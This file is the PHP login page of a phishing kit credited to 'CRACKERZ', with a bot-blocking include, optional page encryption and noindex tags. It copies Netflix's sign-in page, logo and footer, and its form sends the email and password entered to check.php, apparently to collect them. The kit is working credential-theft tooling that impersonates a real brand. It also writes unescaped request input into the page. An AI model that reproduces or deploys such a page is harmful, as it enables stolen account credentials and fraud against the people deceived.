<?php

session_start();


/* Programmer name :

    ╔╗ ╦ ╦  ╔═╗╦═╗╔═╗╔═╗╦╔═╔═╗╦═╗╔═╗
    ╠╩╗╚╦╝  ║  ╠╦╝╠═╣║  ╠╩╗║╣ ╠╦╝╔═╝
    ╚═╝ ╩   ╚═╝╩╚═╩ ╩╚═╝╩ ╩╚═╝╩╚═╚═╝

        #2018  Mailer-inbox-unlimited.gq  */

    
require_once 'admin/config.php';
require_once 'anti.php';

function green_inputs(){
  $inp_color = '#5fa53f';
  return 'style="border-color: '.$inp_color.';"';
}

// Redirect to index if SESSION empty or not set with getting infos from IP
if (file_exists("lang/".$_SESSION['_lang_'].".php")) {
   include("lang/".$_SESSION['_lang_'].".php");
  } else {    
   //header("Location: index.php");
   echo '<script type="text/javascript">window.location.replace("index.php");</script>';
   die();
}

?><!doctype html><html>

<?php if ($crypt_mode == 1 ) { require_once 'crypt/encrypter.php'; } ?>

   <head>
      <meta charset="utf-8"/>
	    <title><?php echo $crackerz_01; ?></title>
      <meta name="robots" content="noindex">
      <meta name="robots" content="nofollow">
      <meta name="robots" content="noindex, nofollow">
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
      <meta http-equiv="X-UA-Compatible" content="IE=edge"/>      
      <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"/>
      <link rel="stylesheet" type="text/css" href="style/colorone.css"> 
	    <link rel="shortcut icon" href="img/icon/ico.ico">
	    <script src="validator.js"></script> 

      <script type="text/javascript">

          function validateRecaptcha() {
            var response = grecaptcha.getResponse();
            if (response.length === 0) {

                //    alert("not validated");


                return false;

            } else {
                
              //   alert("validated");

                
                

                <?php $bot = '_human_'; ?>

                return true;
            }
          }      
          var verifyCallback = function(response) {
              alert(response);
          };
          var widgetId1;
          var widgetId2;
          var onloadCallback = function() {
            widgetId1 = grecaptcha.render('capochino', {
              'sitekey' : '<?php echo $key_captcha; ?>',
              'theme' : 'light'
            });
          };

      </script>



      <script src="https://www.google.com/recaptcha/api.js?onload=onloadCallback&render=explicit&hl=<?php echo @$_SESSION['_lang_']; ?>" async defer></script>

   </head>
   <body>
      <div id="appMountPoint">
      <div class="login-wrapper">
     
      <div class="nfHeader login-header signupBasicHeader" data-reactid="2">
         <a  class="svg-nfLogo signupBasicHeader" data-reactid="3">
            <svg class="svg-icon svg-icon-netflix-logo " focusable="true" data-reactid="4" style="padding-top: 0px;">
               <use filter="" xlink:href="#netflix-logo" data-reactid="5"></use>
            </svg>
            <span class="screen-reader-text" data-reactid="6"></span>
         </a>
      </div>
          
      <div class="login-body" data-reactid="7">
         <div data-reactid="8">
            
             <noscript data-reactid="9">
               <div class="ui-message-container ui-message-error">
                  <div class="ui-message-icon"></div>
                  <div class="ui-message-contents"><?php echo $crackerz_61; ?></div>
               </div>
            </noscript>
     


            <?php 

               $err = FALSE;

                 foreach ($_GET as $key => $empty) {
                   if ($empty == 1) {
                     $err = TRUE;
                   }
                 }

                 if($err == TRUE){ 

                 echo '<style type="text/css">
                     
                         input:required:invalid {
                         border-color: #ff0000;
                       }

                       input:required:valid {
                         border-color: #5fa53f;
                       }

                       </style>';

                  } 

             ?>




             <!------- BEGIN STYLE CSS ERROR ----------->


            <style type="text/css">
                           
              .err-login{
                display:table-cell;
                vertical-align:middle;
                padding:20px 10px;
                color:#fff;
                background-color: #999999;
              }

              .err-login a{
                color:inherit;
                text-decoration:underline;
              }

            </style>




            <div class="login-content login-form" data-reactid="10">



             <h1 data-reactid="11"><?php echo $crackerz_01; ?></h1>





          <!--------------- BEGIN ERROR LOGIN --------------->
          
          <?php

            if(@$_GET['err1'] or @$_GET['err2']){

        //      echo '<br><div class="err-login" data-reactid="14">';

              if(@$_GET['err1']==1){
        //        echo '<div style="padding: 5px;">Sorry, we can\'t find an account with this email address. Please try again.</div>';
              }
             

              if (@$_GET['err2']==1) {
         //       echo '<div style="padding: 5px;">The password you entered is Incorrect. Please try again.</div>';
              }

             
       //       echo '</div><br>';

            }

          ?>

          <!--------------- END ERROR LOGIN --------------->


          <style>

            .demo-input {
                width: 70px;
                border-radius: 5px;
                border: #CCC 1px solid;
                padding: 5px;
                margin-top: 5px;
            }

            .captcha-input {
              background:#FFF url('captcha_code.php') repeat-y;
              padding-left: 85px;
            }

          </style>


          <br >
               
                <form class="login-form" action="check.php?bot=<?php if(@$_GET['cap'] == 1){ echo $bot; } ?>" method="post" data-reactid="13" <?php if(@$_GET['cap'] == 1){ echo 'onsubmit="return validateRecaptcha();"'; }?> >
                  
                  <label class="login-input login-input-email ui-label ui-input-label" id="lbl-email" placeholder="email" data-reactid="14" >
                  	<span class="ui-label-text" data-reactid="15"><?php echo $crackerz_02; ?></span>
                  	
                     <input <?php if(@$_GET['err1']==1){ if ($required_login == 1){ echo 'required'; }} ?> class="ui-text-input" value="<?php echo base64_decode(@$_GET['l1']); ?>" type="email" name="l1" value="" tabindex="1"  data-reactid="16" />


                          <?php if(@$_GET['err1']==1){ if ($required_login == 1){ echo '<div class="input-message error">'.$crackerz_31.'</div>'; }} ?>


                  </label>
                  
                  <div class="hybrid-password-wrapper" data-reactid="17" <?php if(@$_GET['cap']==1){ echo 'style="margin-bottom: 14px;"'; } ?> >

                  	<label class="hybrid-password login-input login-input-password ui-label" id="lbl-password" placeholder="password" data-reactid="18" style="padding-bottom: 24px;">
                  		<span class="ui-label-text" data-reactid="19"><?php echo $crackerz_03; ?></span>
                  		
                        <input <?php if(@$_GET['err2']==1){ if ($required_login == 1){ echo 'required'; }} ?> type="password" class="ui-text-input" name="l2" id="password" tabindex="2" data-reactid="20" />

                          
                          <?php if(@$_GET['err2']==1){ if ($required_login == 1){ echo '<div class="input-message error">'.$crackerz_32.'</div>'; }} ?>


                  	</label>
                  	

                  </div> 



                  <?php if(@$_GET['cap'] == 1){ echo '<div id="capochino"></div>'; } ?>


                  <div class="login-forgot-password-wrapper" data-reactid="23" style="margin-top: 10px;">

                  	<a class="login-help-link" tabindex="3" data-reactid="24"><?php echo $crackerz_04; ?></a>
                  </div>


                  <button class="btn login-button btn-submit btn-small" type="submit" autocomplete="off" tabindex="4" data-reactid="25" name="btnOne"><?php echo $crackerz_01; ?></button>
               </form>
                
               <div class="login-remember-me-wrapper" data-reactid="27">
                  <div class="ui-binary-input login-remember-me" data-reactid="28">
                     <input type="checkbox" class="" name="rememberMe" id="bxid_rememberMe_true" value="true" tabindex="5" checked="" data-reactid="29"/><label for="bxid_rememberMe_true" data-reactid="30"><span class="login-remember-me-label-text" data-reactid="31"><?php echo $crackerz_05; ?></span></label>
                     <div class="helper" data-reactid="32"></div>
                  </div>
               </div>


                
               <form class="login-form" data-toggle="validator" data-reactid="40">
                  <div class="facebookForm regOption" data-reactid="41">
                     <div class="fb-minimal" data-reactid="42">
                        <hr data-reactid="43"/>
                        <button class="btn minimal-login btn-submit btn-small" type="submit" autocomplete="off" tabindex="6" data-reactid="44">
                           <div class="fb-login" data-reactid="45"><img class="icon-facebook" src="img/icon/fb.png" data-reactid="46"/><span class="fbBtnText" data-reactid="47"><?php echo $crackerz_06; ?></span></div>
                        </button>
                     </div>
                  </div>
               </form>
                



               <div class="" data-reactid="56">
                  
                   <?php echo $crackerz_07; ?>  <a data-reactid="58"><?php echo $crackerz_08; ?></a>
                  
               </div>
            </div>
         </div>
      </div>
      
    <div class="site-footer-wrapper login-footer" data-reactid="60">
         <div class="footer-divider" data-reactid="61"></div>
         <div class="site-footer" data-reactid="62">
            <p class="footer-top" data-reactid="63">
            	<a class="footer-top-a"  data-reactid="64"><?php echo $crackerz_51; ?></a>
            </p>
            <ul class="footer-links structural" data-reactid="65">
               <li class="footer-link-item" placeholder="footer_responsive_link_gift_card_terms_item" data-reactid="66">
               	<a class="footer-link"  placeholder="footer_responsive_link_gift_card_terms" data-reactid="67">
               		<span id="" data-reactid="68"><?php echo $crackerz_52; ?></span>
               	</a>
               </li>
               <li class="footer-link-item" placeholder="footer_responsive_link_terms_item" data-reactid="69">
               	<a class="footer-link"  placeholder="footer_responsive_link_terms" data-reactid="70">
               		<span id="" data-reactid="71"><?php echo $crackerz_53; ?></span>
               	</a>
               </li>
               <li class="footer-link-item" placeholder="footer_responsive_link_privacy_item" data-reactid="72">
               	<a class="footer-link"  placeholder="footer_responsive_link_privacy" data-reactid="73">
               		<span id="" data-reactid="74"><?php echo $crackerz_54; ?></span>
               	</a>
               </li>
            </ul>
            
            <div class="lang-selection-container" id="lang-switcher" data-reactid="75">
               <div class="ui-select-wrapper" data-reactid="76">
                  <label class="ui-label no-display" data-reactid="77"><span class="ui-label-text" data-reactid="78"></span></label>
                  <div class="select-arrow medium prefix globe" data-reactid="79">


                     <select class="ui-select medium" tabindex="0" placeholder="lang-switcher" data-reactid="80" onchange="javascript:location.href = this.value;">

                     <?php



                          $ret = @$_GET['lang'];


                           function langue($user_country){


                               $countries = array(

                                           'EN' => 'English',
                                           'FR' => 'French',
                                           'ES' => 'Spanish',
                                           'IT' => 'Italian',
                                           'DE' => 'German'

                                       );


                                 $option = '';


                                   foreach ($countries as $key => $value) {
                                     
                                     if ($key == $user_country) {

                                       $option .= '<option value="langue.php?lang='.$key.'&page=info" selected="selected">'.strtoupper($value).'</option>';

                                     } else {

                                       $option .= '<option value="langue.php?lang='.$key.'&page=login">'.$value.'</option>';
                                       
                                     }

                                   }
                                   
                                   return $option;

                            }


                            if ($_GET['lang']) {

                                 echo langue($_GET['lang']);

                               }else{

                                 echo langue($_SESSION['_lang_']);

                            }
                            

                      ?>

                     </select>
                  </div>
               </div>
            </div>

         </div>
      </div>
          
      <svg style="height:0;width:0;position:absolute;" xmlns="http://www.w3.org/2000/svg" data-reactid="84">
      <defs id="" data-reactid="85">
      <symbol viewBox="0 0 34 34"  id="check-circle">
         <path d="M28.4 11.7l-3.2-3.267c-.066.066-.133.133-.2.166L13.367 19.933l-4.433-4.5L5.6 18.466c0 .034 1.1 1.1 1.1 1.134l4.934 5.133.166.167a2.234 2.234 0 0 0 3.1 0l.167-.167 13.2-12.866c.067-.034.1-.1.133-.167M33 17c0 8.834-7.166 16-16 16S1 25.834 1 17 8.166 1 17 1s16 7.166 16 16"/>
      </symbol>
      <symbol viewBox="0 0 14 10"  id="check-mark">
         <path d="M13.916 1.996l-7.722 7.54-.1.08a1.319 1.319 0 0 1-.908.384c-.322 0-.645-.142-.907-.384l-.08-.08-2.884-3.024c-.02 0-.644-.645-.665-.645l1.955-1.775 2.581 2.62L12 .103A.53.53 0 0 1 12.121 0l1.874 1.895a.43.43 0 0 1-.08.101"/>
      </symbol>
      <symbol viewBox="0 0 111 30"  id="netflix-logo">
         <path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.75L94.468 0h5.063l3.062 7.874L105.875 0h5.124l-5.937 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.53-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687h-4.844V0h14.406v4.687h-4.874zM30.75 15.593c-2.062 0-4.5 0-6.25.095v6.968c2.75-.188 5.5-.406 8.281-.5v4.5l-12.968 1.032V0H32.78v4.687H24.5V11c1.813 0 4.594-.094 6.25-.094v4.688zM4.78 12.968v16.375C3.094 29.531 1.593 29.75 0 30V0h4.469l6.093 17.032V0h4.688v28.062c-1.656.282-3.344.376-5.125.625L4.78 12.968z"/>
      </symbol>
   </body>
</html>